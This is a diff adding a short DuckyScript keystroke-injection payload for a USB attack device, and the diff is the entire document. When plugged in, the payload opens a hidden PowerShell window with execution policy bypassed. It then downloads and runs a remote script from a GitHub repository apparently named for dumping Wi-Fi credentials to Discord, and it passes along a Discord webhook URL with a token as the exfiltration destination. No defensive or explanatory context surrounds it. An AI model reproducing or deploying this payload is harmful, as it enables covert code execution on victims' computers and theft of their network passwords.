@@ -1,0 +1,10 @@
+DELAY 2000
+GUI r
+DELAY 250
+STRING powershell -w h -ep bypass $discord='
+
+DEFINE DISCORD https://discord.com/api/webhooks/1307452823260233773/es9OJ5kZdt2F1Ije9eyibBms4i5sGWpgPgSVZXWbJJanfdyLXaLj3VUZqlfFBp4-Ipuh
+STRING DISCORD
+
+DEFINE PAYLOAD https://raw.githubusercontent.com/APT-Ubub0x/Wlan-Dump-Discord/refs/heads/main/script.ps1
+STRINGLN ';irm PAYLOAD | iex
